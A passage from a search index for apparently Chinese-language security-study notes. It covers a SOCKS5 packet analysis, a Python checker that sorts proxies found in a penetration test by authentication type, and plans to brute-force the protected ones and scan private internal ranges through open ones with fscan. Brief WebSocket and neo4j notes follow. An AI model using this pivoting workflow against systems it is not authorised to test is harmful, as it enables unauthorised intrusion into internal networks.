BND.PORT\u3000\u670d\u52a1\u7aef\u7ed1\u5b9a\u7aef\u53e3 \uff08\u7f51\u7edc\u5b57\u8282\u5e8f\uff09 \u6bd4\u5982\u6211\u6293\u7684\u8fd9\u4e2a\u5305\u5c31\u662f\u89c4\u5219\u4e0d\u5141\u8bb8 \u6293\u5305\u5206\u6790\u603b\u7ed3 tcp\u4e09\u6b21\u63e1\u624b\u2192\u8ba4\u8bc1\u9636\u6bb5\u2192\u5730\u5740\u8bf7\u6c42 \u811a\u672c\u7f16\u5199 \u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5236\u5b9asocks5\u53ef\u7528\u6027\u68c0\u6d4b\u7684\u601d\u8def\uff1a \u4e09\u6b21\u63e1\u624b\u5931\u8d25->\u65e0\u6548 \u5411server\u53d1\u9001\u8bf7\u6c42\u8ba4\u8bc1\uff0c\u8bf7\u6c4200\uff08\u65e0\u9700\u8ba4\u8bc10\uff09\u548c02\uff08\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\uff09 server\u8fd4\u56de0xff ->\u65e0\u6548 \u8fd4\u56de00->\u6709\u620f \u8fd4\u56de02->\u653e\u5230\u4e00\u8fb9\uff0c\u5f85\u4f1a\u6765\u7206\u5bc6\u7801 \u5411\u8bf7\u6c42\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u8fd4\u56de00\u7684server\u53d1\u9001\u5730\u5740\u8ba4\u8bc1\uff0c\u8bf7\u6c42\u4e00\u4e2asocks5\u53ef\u80fd\u8bbf\u95ee\u5f97\u5230\u7684ip:port \u8fd4\u56de00->socks5\u53ef\u7528\u6027\u68c0\u6d4b\u901a\u8fc7 \u8fd4\u56de02-06:\u53ef\u80fd\u662fsocks5\u65e0\u6cd5\u8bbf\u95ee\u8fd9\u4e2aip\uff1aport\uff0c\u6362\u6210\u522b\u7684\u8bd5\u8bd5\uff08\u6279\u91cf\u8dd1\u4e00\u6ce2\u5185\u7f51\uff09 \u8fd4\u56de\u5176\u5b83\uff1a\u5927\u6982\u7387\u6ca1\u620f\uff0c\u4e0d\u7528\u770b\u4e86 \u968f\u624b\u5199\u7684\u68c0\u6d4b\u811a\u672c import requests import concurrent.futures import socket from urllib.parse import urlparse def check_proxy(proxy): urls = [\"http://127.0.0.1:110\"] for url in urls: try: response = requests.get(url, proxies={\"http\": proxy, \"https\": proxy}, timeout=5) print(f\"Proxy {proxy} is working for {url}\") except requests.exceptions.RequestException as E: print(f\"{proxy}:{E}\") def socket_check(proxy): # \u521b\u5efa\u4e00\u4e2asocket\u5bf9\u8c61 proxy_parse = urlparse(proxy) host = proxy_parse.hostname port = proxy_parse.port sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) # \u8fde\u63a5\u5230SOCKS5\u4ee3\u7406\u670d\u52a1\u5668 sock.connect((host,port)) # \u53d1\u9001\u8ba4\u8bc1\u8bf7\u6c42 sock.sendall(b\"\\x05\\x02\\x00\\x02\") # \u8bfb\u53d6\u4ee3\u7406\u670d\u52a1\u5668\u7684\u54cd\u5e94 data = sock.recv(2) # \u5224\u65ad\u662f\u5426\u65e0\u9700\u8ba4\u8bc1 if len(data) == 2 and data[0] == 0x05 and data[1] == 0x00: print(f\"{proxy}:\u65e0\u9700\u8ba4\u8bc1\") l00.append(proxy) elif len(data) == 2 and data[0] == 0x05 and data[1] == 0x02: print(f\"{proxy}:\u9700\u8981\u8ba4\u8bc1\") l02.append(proxy) elif len(data) == 2 and data[0] == 0x05 and data[1] == 0xff: print(f\"{proxy}:\u4ee3\u7406\u5b58\u5728\u4f46\u662f\u4e0d\u63a5\u53d7\") lff.append(proxy) else: print(f\"{proxy} \u4e0d\u662fsocks5\") nop.append(proxy) with open('socks5_verify.txt', 'r') as file: l00=[] l02=[] lff=[] nop=[] #with concurrent.futures.ThreadPoolExecutor() as executor: # executor.map(socket_check, file) #for i in file: # socket_check(i) print(f\"\u65e0\u9700\u8ba4\u8bc1\uff1a:{l00}\") print(f\"\u9700\u8981\u5bc6\u7801:{l02}\") print(f\"socks5\u4ee3\u7406\u5b58\u5728\uff0c\u4f46\u662f\u9a8c\u8bc1\u65b9\u5f0f\u4e0d\u5141\u8bb8:{lff}\") print(f\"\u975esocks5\u4ee3\u7406:{nop}\") for proxy in l00: check_proxy(proxy) \u7136\u540e\u628a\u65e0\u9700\u8ba4\u8bc1\u7684socks5\u62ff\u5230fscan\u8bbe\u7f6e\u4ee3\u7406\uff0c\u8dd1\u8dd1\u5185\u7f51\uff0c\u5174\u8bb8\u6709\u5947\u8ff9 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16","title":"socks5"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#socks5","text":"","title":"socks5"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#_1","text":"\u5224\u65adsocks5\u94fe\u63a5\u53ef\u7528\u6027 curl\u6cd5 \u6570\u636e\u5305\u5206\u6790 \u6293\u5305\u5206\u6790\uff1aTCP\u4e09\u6b21\u63e1\u624b \u6293\u5305\u5206\u6790\uff1aclient\uff0c\u8bf7\u6c42\u8ba4\u8bc1 \u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u8ba4\u8bc1 \u6293\u5305\u5206\u6790\uff1aclient\uff0c\u53d1\u9001\u5730\u5740\u8bf7\u6c42 \u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u5730\u5740\u8bf7\u6c42 \u6293\u5305\u5206\u6790\u603b\u7ed3 \u811a\u672c\u7f16\u5199","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#socks5_1","text":"","title":"\u5224\u65adsocks5\u94fe\u63a5\u53ef\u7528\u6027"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#curl","text":"curl --socks5 \u4f60\u7684\u4ee3\u7406IP:\u7aef\u53e3\u53f7 https://www.example.com \u539f\u59cb\u65b9\u6cd5","title":"curl\u6cd5"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#_2","text":"ref\uff1a\u6293\u5305\u5206\u6790\uff1a https://zgao.top/\u5947\u5b89\u4fe1\u5b9e\u4e60\u4e94-socks5\u534f\u8bae\u6293\u5305\u5206\u6790/ https://www.quarkay.com/code/383/socks5-protocol-rfc-chinese-traslation https://samsclass.info/122/proj/how-socks5-works.html \u6e17\u900f\u7684\u65f6\u5019\uff0c\u626b\u63cf\u626b\u5230\u4e86\u4e00\u6279socks5\u94fe\u63a5\u3002 \u60f3\u9a8c\u8bc1\u4ed6\u4eec\u7684\u53ef\u7528\u6027\u65f6\uff0c\u9047\u5230\u4e86\u5982\u4e0b\u95ee\u9898 socks5 \u94fe\u63a5\u662f\u5426\u771f\u7684\u662fsocks5\uff1f socks5 \u94fe\u63a5\u80fd\u901a\u54ea\u4e9b\u7f51\u7edc\uff08\u516c\u7f51\uff1f10\u6bb5\uff1f172\u6bb5\uff1f\uff09 socks5 \u662f\u5426\u9700\u8981\u5bc6\u7801\uff1f \u4e8e\u662f\u6253\u7b97\u901a\u8fc7\u6570\u636e\u5305\u5206\u6790\u6765\u597d\u597d\u9a8c\u8bc1socks5\u7684\u53ef\u7528\u6027","title":"\u6570\u636e\u5305\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#tcp","text":"\u5728\u5f00\u59cbsocks5\u4e4b\u524d\uff0c\u4f1a\u8fdb\u884c\u4e09\u6b21\u63e1\u624b","title":"\u6293\u5305\u5206\u6790\uff1aTCP\u4e09\u6b21\u63e1\u624b"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#client","text":"VER \uff08\u7248\u672c\uff09\u5b57\u6bb5\u5728\u6b64\u7248\u672c\u4e2d\u8bbe\u7f6e\u4e3a X\u201905\u2018 NMETHODS \uff08\u65b9\u6cd5\u6570\u76ee\uff09\u5b57\u6bb5\u5305\u542b\u4e86 METHODS \uff08\u65b9\u6cd5\u5217\u8868\uff09\u4e2d\u6240\u5305\u542b\u7684\u65b9\u6cd5\u8bc6\u522b\u7801\u7684\u4e2a\u6570\u3002 METHODS\u5982\u4e0b\u8868 X\u201900\u2018\u3000\u3000\u65e0\u9700\u8ba4\u8bc1 X\u201901\u2018\u3000\u3000GSSAPI X\u201902\u2018\u3000\u3000\u7528\u6237\u540d/\u5bc6\u7801 X\u201903\u2018\u3000\u5230\u3000X\u20197F\u2019\u3000\u3000IANA \u6307\u5b9a X\u201980\u2018\u3000\u5230\u3000X\u2019FE\u2019\u3000\u3000\u4e3a\u79c1\u6709\u65b9\u6cd5\u4fdd\u7559 X\u2019FF\u2018\u3000\u3000\u65e0\u53ef\u63a5\u53d7\u65b9\u6cd5 \u5982\u4e0b\u4fbf\u662f \u65b9\u6cd5\u6570\u76ee\u4e3a1\uff0c\u4e14\u65b9\u6cd5\u4e3a \u65e0\u9700\u8ba4\u8bc1\uff0800\uff09\u7684client\u8bf7\u6c42\u8ba4\u8bc1\u5305","title":"\u6293\u5305\u5206\u6790\uff1aclient\uff0c\u8bf7\u6c42\u8ba4\u8bc1"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#server","text":"VER \uff08\u7248\u672c\uff09\u5b57\u6bb5\u5728\u6b64\u7248\u672c\u4e2d\u8bbe\u7f6e\u4e3a X\u201905\u2018 METHOD\u8868\u793a\u4ece\u8bf7\u6c42\u8ba4\u8bc1\u4e2d\uff0c\u9009\u62e9\u4e00\u4e2a\u65b9\u6cd5\u4f5c\u4e3a\u8ba4\u8bc1\uff08\u5982\u679c METHOD \uff08\u65b9\u6cd5\uff09\u5b57\u6bb5\u4e3a X\u2019FF\u2018\uff0c \u8868\u793a\u65b9\u6cd5\u5217\u8868\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u5747\u4e0d\u53ef\u7528\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u6b64\u4fe1\u606f\u5fc5\u987b\u5173\u95ed\u8fde\u63a5\u3002\uff09 0500\u8868\u793a\u63a5\u53d7client\u7684\u65e0\u9700\u8ba4\u8bc1\u7684\u8ba4\u8bc1\u8bf7\u6c42\uff0c0500\u540e\u9762\u7684\u662f\u586b\u5145padding\uff0c\u4e0d\u7ba1\u3002","title":"\u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u8ba4\u8bc1"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#client_1","text":"VER\u3000\u534f\u8bae\u7248\u672c\uff1a X\u201805\u2019 CMD\u3000\u547d\u4ee4 CONNECT\u3000\u8fde\u63a5\uff0c X\u201801\u2019 BIND\u3000\u76d1\u542cX\u201802\u2019 UDP ASSOCIATE\u3000UDP\u5173\u8054 X\u201803\u2019 RSV\u3000\u4fdd\u7559\u5b57\u6bb5 ATYP\u3000\u5730\u5740\u7c7b\u578b IPV4\u3000X\u201801\u2019 \u57df\u540d\u3000X\u201803\u2019 IPV6\u3000X\u201804\u2019 DST.ADDR\u3000\u76ee\u6807\u5730\u5740 DST.PORT\u3000\u76ee\u6807\u7aef\u53e3 \uff08\u7f51\u7edc\u5b57\u8282\u5e8f\uff09 \u6293\u5230\u7684\u5305 05:ver 01:CMD\u2192connect 00: \u4fdd\u7559 01: \u5730\u5740\u7c7b\u578b IPV4 17f000001: \u8981\u4ee3\u7406\u7684\u5730\u5740\uff08\u6211\u8fd9\u91cc\u8bf7\u6c42\u7684\u662f127.0.0.1\uff09 006e \uff1a\u8981\u4ee3\u7406\u7684\u5730\u5740\u7684\u7aef\u53e3\uff08\u6211\u8fd9\u91cc\u8bf7\u6c42\u7684\u662f110\uff0c6e\u7684\u8f6c10\u8fdb\u5236\u5c31\u662f110\uff09","title":"\u6293\u5305\u5206\u6790\uff1aclient\uff0c\u53d1\u9001\u5730\u5740\u8bf7\u6c42"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#server_1","text":"VER\u534f\u8bae\u7248\u672c\uff1a\u3000X\u201805\u2019 REP \u56de\u590d\u5b57\u6bb5\uff08\u56de\u590d\u7c7b\u578b\uff09\uff1a X\u201800\u2019\u3000\u6210\u529f X\u201801\u2019\u3000\u5e38\u89c4 SOCKS \u670d\u52a1\u6545\u969c X\u201802\u2019\u3000\u89c4\u5219\u4e0d\u5141\u8bb8\u7684\u8fde\u63a5 X\u201803\u2019\u3000\u7f51\u7edc\u4e0d\u53ef\u8fbe X\u201804\u2019\u3000\u4e3b\u673a\u65e0\u6cd5\u8bbf\u95ee X\u201805\u2019\u3000\u62d2\u7edd\u8fde\u63a5 X\u201806\u2019\u3000\u8fde\u63a5\u8d85\u65f6 X\u201807\u2019\u3000\u4e0d\u652f\u6301\u7684\u547d\u4ee4 X\u201808\u2019\u3000\u4e0d\u652f\u6301\u7684\u5730\u5740\u7c7b\u578b X\u201809\u2019\u3000\u5230\u3000X\u2019FF\u2019\u3000\u672a\u5b9a\u4e49 RSV\u3000\u4fdd\u7559\u5b57\u6bb5 ATYP\u3000\u5730\u5740\u7c7b\u578b IPV4\u3000X\u201801\u2019 \u57df\u540d\u3000X\u201803\u2019 IPV6\u3000X\u201804\u2019 BND.ADDR\u3000\u670d\u52a1\u7aef\u7ed1\u5b9a\u5730\u5740 BND.PORT\u3000\u670d\u52a1\u7aef\u7ed1\u5b9a\u7aef\u53e3 \uff08\u7f51\u7edc\u5b57\u8282\u5e8f\uff09 \u6bd4\u5982\u6211\u6293\u7684\u8fd9\u4e2a\u5305\u5c31\u662f\u89c4\u5219\u4e0d\u5141\u8bb8","title":"\u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u5730\u5740\u8bf7\u6c42"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#_3","text":"tcp\u4e09\u6b21\u63e1\u624b\u2192\u8ba4\u8bc1\u9636\u6bb5\u2192\u5730\u5740\u8bf7\u6c42","title":"\u6293\u5305\u5206\u6790\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/#_4","text":"\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5236\u5b9asocks5\u53ef\u7528\u6027\u68c0\u6d4b\u7684\u601d\u8def\uff1a \u4e09\u6b21\u63e1\u624b\u5931\u8d25->\u65e0\u6548 \u5411server\u53d1\u9001\u8bf7\u6c42\u8ba4\u8bc1\uff0c\u8bf7\u6c4200\uff08\u65e0\u9700\u8ba4\u8bc10\uff09\u548c02\uff08\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\uff09 server\u8fd4\u56de0xff ->\u65e0\u6548 \u8fd4\u56de00->\u6709\u620f \u8fd4\u56de02->\u653e\u5230\u4e00\u8fb9\uff0c\u5f85\u4f1a\u6765\u7206\u5bc6\u7801 \u5411\u8bf7\u6c42\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u8fd4\u56de00\u7684server\u53d1\u9001\u5730\u5740\u8ba4\u8bc1\uff0c\u8bf7\u6c42\u4e00\u4e2asocks5\u53ef\u80fd\u8bbf\u95ee\u5f97\u5230\u7684ip:port \u8fd4\u56de00->socks5\u53ef\u7528\u6027\u68c0\u6d4b\u901a\u8fc7 \u8fd4\u56de02-06:\u53ef\u80fd\u662fsocks5\u65e0\u6cd5\u8bbf\u95ee\u8fd9\u4e2aip\uff1aport\uff0c\u6362\u6210\u522b\u7684\u8bd5\u8bd5\uff08\u6279\u91cf\u8dd1\u4e00\u6ce2\u5185\u7f51\uff09 \u8fd4\u56de\u5176\u5b83\uff1a\u5927\u6982\u7387\u6ca1\u620f\uff0c\u4e0d\u7528\u770b\u4e86 \u968f\u624b\u5199\u7684\u68c0\u6d4b\u811a\u672c import requests import concurrent.futures import socket from urllib.parse import urlparse def check_proxy(proxy): urls = [\"http://127.0.0.1:110\"] for url in urls: try: response = requests.get(url, proxies={\"http\": proxy, \"https\": proxy}, timeout=5) print(f\"Proxy {proxy} is working for {url}\") except requests.exceptions.RequestException as E: print(f\"{proxy}:{E}\") def socket_check(proxy): # \u521b\u5efa\u4e00\u4e2asocket\u5bf9\u8c61 proxy_parse = urlparse(proxy) host = proxy_parse.hostname port = proxy_parse.port sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) # \u8fde\u63a5\u5230SOCKS5\u4ee3\u7406\u670d\u52a1\u5668 sock.connect((host,port)) # \u53d1\u9001\u8ba4\u8bc1\u8bf7\u6c42 sock.sendall(b\"\\x05\\x02\\x00\\x02\") # \u8bfb\u53d6\u4ee3\u7406\u670d\u52a1\u5668\u7684\u54cd\u5e94 data = sock.recv(2) # \u5224\u65ad\u662f\u5426\u65e0\u9700\u8ba4\u8bc1 if len(data) == 2 and data[0] == 0x05 and data[1] == 0x00: print(f\"{proxy}:\u65e0\u9700\u8ba4\u8bc1\") l00.append(proxy) elif len(data) == 2 and data[0] == 0x05 and data[1] == 0x02: print(f\"{proxy}:\u9700\u8981\u8ba4\u8bc1\") l02.append(proxy) elif len(data) == 2 and data[0] == 0x05 and data[1] == 0xff: print(f\"{proxy}:\u4ee3\u7406\u5b58\u5728\u4f46\u662f\u4e0d\u63a5\u53d7\") lff.append(proxy) else: print(f\"{proxy} \u4e0d\u662fsocks5\") nop.append(proxy) with open('socks5_verify.txt', 'r') as file: l00=[] l02=[] lff=[] nop=[] #with concurrent.futures.ThreadPoolExecutor() as executor: # executor.map(socket_check, file) #for i in file: # socket_check(i) print(f\"\u65e0\u9700\u8ba4\u8bc1\uff1a:{l00}\") print(f\"\u9700\u8981\u5bc6\u7801:{l02}\") print(f\"socks5\u4ee3\u7406\u5b58\u5728\uff0c\u4f46\u662f\u9a8c\u8bc1\u65b9\u5f0f\u4e0d\u5141\u8bb8:{lff}\") print(f\"\u975esocks5\u4ee3\u7406:{nop}\") for proxy in l00: check_proxy(proxy) \u7136\u540e\u628a\u65e0\u9700\u8ba4\u8bc1\u7684socks5\u62ff\u5230fscan\u8bbe\u7f6e\u4ee3\u7406\uff0c\u8dd1\u8dd1\u5185\u7f51\uff0c\u5174\u8bb8\u6709\u5947\u8ff9 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16","title":"\u811a\u672c\u7f16\u5199"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/websocket/websocket/","text":"websocket \u76ee\u5f55 \u534f\u8bae \u534f\u8bae \u5168\u53cc\u5de5\uff0c\u7531http\u534f\u8bae\u5347\u7ea7\u800c\u6765\u7684\u534f\u8bae\u3002 \u534f\u8bae\u5347\u7ea7\u662f\u6307\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2aHTTP\u8bf7\u6c42\uff0c\u8bf7\u6c42\u5c06\u534f\u8bae\u4eceHTTP\u534f\u8bae\u5347\u7ea7\u4e3aWebSocket\u534f\u8bae\u3002\u670d\u52a1\u5668\u6536\u5230\u8be5\u8bf7\u6c42\u540e\uff0c\u68c0\u67e5\u662f\u5426\u652f\u6301WebSocket\u534f\u8bae\uff0c\u5982\u679c\u652f\u6301\uff0c\u5219\u54cd\u5e94HTTP 101\u72b6\u6001\u7801\uff0c\u5e76\u5728HTTP\u5934\u4e2d\u5305\u542b\u4e00\u4e2a\"Upgrade\"\u5b57\u6bb5\uff0c\u8868\u793a\u534f\u8bae\u5df2\u5347\u7ea7\u4e3aWebSocket\u534f\u8bae\u3002 \u534f\u8bae\u5347\u7ea7\u8be6\u89e3\uff1a https://juejin.cn/post/6844904001880719373 \u63e1\u624b\u8fc7\u7a0b\u5927\u89c8\uff0c\u53ea\u9700\u8981\u4e00\u4e2areq\u4e00\u4e2aresp \u5ba2\u6237\u7aef\u53d1\u8d77\u63e1\u624b\u8bf7\u6c42 \u670d\u52a1\u7aef\u56de\u5e94\u63e1\u624b\u8bf7\u6c42","title":"websocket"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/websocket/websocket/#websocket","text":"","title":"websocket"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/websocket/websocket/#_1","text":"\u534f\u8bae","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/websocket/websocket/#_2","text":"\u5168\u53cc\u5de5\uff0c\u7531http\u534f\u8bae\u5347\u7ea7\u800c\u6765\u7684\u534f\u8bae\u3002 \u534f\u8bae\u5347\u7ea7\u662f\u6307\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2aHTTP\u8bf7\u6c42\uff0c\u8bf7\u6c42\u5c06\u534f\u8bae\u4eceHTTP\u534f\u8bae\u5347\u7ea7\u4e3aWebSocket\u534f\u8bae\u3002\u670d\u52a1\u5668\u6536\u5230\u8be5\u8bf7\u6c42\u540e\uff0c\u68c0\u67e5\u662f\u5426\u652f\u6301WebSocket\u534f\u8bae\uff0c\u5982\u679c\u652f\u6301\uff0c\u5219\u54cd\u5e94HTTP 101\u72b6\u6001\u7801\uff0c\u5e76\u5728HTTP\u5934\u4e2d\u5305\u542b\u4e00\u4e2a\"Upgrade\"\u5b57\u6bb5\uff0c\u8868\u793a\u534f\u8bae\u5df2\u5347\u7ea7\u4e3aWebSocket\u534f\u8bae\u3002 \u534f\u8bae\u5347\u7ea7\u8be6\u89e3\uff1a https://juejin.cn/post/6844904001880719373 \u63e1\u624b\u8fc7\u7a0b\u5927\u89c8\uff0c\u53ea\u9700\u8981\u4e00\u4e2areq\u4e00\u4e2aresp \u5ba2\u6237\u7aef\u53d1\u8d77\u63e1\u624b\u8bf7\u6c42 \u670d\u52a1\u7aef\u56de\u5e94\u63e1\u624b\u8bf7\u6c42","title":"\u534f\u8bae"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E9%95%BF%E9%93%BE%E6%8E%A5/%E9%95%BF%E9%93%BE%E6%8E%A5/","text":"\u957f\u94fe\u63a5","title":"\u957f\u94fe\u63a5"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E9%95%BF%E9%93%BE%E6%8E%A5/%E9%95%BF%E9%93%BE%E6%8E%A5/#_1","text":"","title":"\u957f\u94fe\u63a5"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/","text":"\u5f00\u53d1\u3001\u4e1a\u52a1\u5b66\u4e60\u533a \u5f00\u53d1 \u6742\u6280 \u9a7e\u9a6dmac","title":"\u5f00\u53d1\u3001\u4e1a\u52a1\u5b66\u4e60\u533a"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/#_1","text":"\u5f00\u53d1 \u6742\u6280 \u9a7e\u9a6dmac","title":"\u5f00\u53d1\u3001\u4e1a\u52a1\u5b66\u4e60\u533a"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%BC%80%E5%8F%91/","text":"\u5f00\u53d1 \u5165\u95e8neo4j\u6570\u636e\u5e93","title":"\u5f00\u53d1"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%BC%80%E5%8F%91/#_1","text":"\u5165\u95e8neo4j\u6570\u636e\u5e93","title":"\u5f00\u53d1"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/","text":"\u5165\u95e8neo4j\u6570\u636e\u5e93 \u7b80\u4ecb RDBMS \u4e0e GDBMS RDBMS \u662f\u4ee5 \u8868\u3001\u884c\u3001\u5217\u5b58\u50a8\u6570\u636e\u7684\u6570\u636e\u5e93\uff1bGDBMS\u662f\u4ee5\u56fe\u5f62\u5b58\u50a8\u7684\u6570\u636e\u5e93\u3002 neo4j\u5c31\u662f\u56fe\u6570\u636e\u5e93\uff0cGDBMS\u7684\u4e00\u79cd\u3002\u5b83\u5f88\u9002\u7528\u4e8e\u904d\u5386\u5927\u91cf\u6570\u636e\u3002 \u6570\u636e\u6a21\u578b \u5c5e\u6027\u56fe\u6a21\u578b\u89c4\u5219 \u8868\u793a\u8282\u70b9\uff0c\u5173\u7cfb\u548c\u5c5e\u6027\u4e2d\u7684\u6570\u636e \u8282\u70b9\u548c\u5173\u7cfb\u90fd\u5305\u542b\u5c5e\u6027 \u5173\u7cfb\u8fde\u63a5\u8282\u70b9 \u5c5e\u6027\u662f\u952e\u503c\u5bf9 \u8282\u70b9\u7528\u5706\u5708\u8868\u793a\uff0c\u5173\u7cfb\u7528\u65b9\u5411\u952e\u8868\u793a\u3002 \u5173\u7cfb\u5177\u6709\u65b9\u5411\uff1a\u5355\u5411\u548c\u53cc\u5411\u3002 \u6bcf\u4e2a\u5173\u7cfb\u5305\u542b\u201c\u5f00\u59cb\u8282\u70b9\u201d\u6216\u201c\u4ece\u8282\u70b9\u201d\u548c\u201c\u5230\u8282\u70b9\u201d\u6216\u201c\u7ed3\u675f\u8282\u70b9\u201d \u6bcf\u4e2a\u5173\u7cfb\u90fd\u662f\u5b9a\u5411\u7684\uff0c\u82e5\u6ca1\u6709\u65b9\u5411\u5219\u4f1a\u629b\u51fa\u9519\u8bef \u56fe\u5f62\u6570\u636e\u5e93\u6570\u636e\u6a21\u578b\u662f\u7531\uff1a\u8282\u70b9\uff0c\u5173\u7cfb\uff0c\u5c5e\u6027\u6784\u6210\u7684\uff0c\u5c31\u50cf\u8fd9\u6837 CQL CQL\u662fCypher\u67e5\u8be2\u8bed\u8a00\uff0cNeo4j\u9009\u7528CQL\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00 CQL \u6570\u636e\u7c7b\u578b CREATE\\&MERGE CREATE \u7528\u4e8e\u521b\u5efa\u8282\u70b9\uff0c\u5173\u7cfb\uff0c\u4ee5\u53ca\u4e3a\u8282\u70b9\u6216\u5173\u7cfb\u6dfb\u52a0\u6807\u7b7e \u521b\u5efa\u65e0\u5c5e\u6027\u8282\u70b9\uff1aCREATE (<node-name>:<label-name>) CREATE (<node-name>:<label-name1>:<label-name2>.....:<label-namen>) \u521b\u5efa\u591a\u4e2a\u6807\u7b7e\u5230\u8282\u70b9 node-name : \u8282\u70b9\u540d lable-name: \u6807\u7b7e\u540d\uff0c\u6211\u4eec\u4e00\u822c\u7528\u6807\u7b7e\u540d\u6765\u8bbf\u95ee\u67d0\u4e2a\u8282\u70b9\u7684\u8be6\u7ec6\u4fe1\u606f \u521b\u5efa\u6709\u5c5e\u6027\u8282\u70b9\uff1a CREATE ( 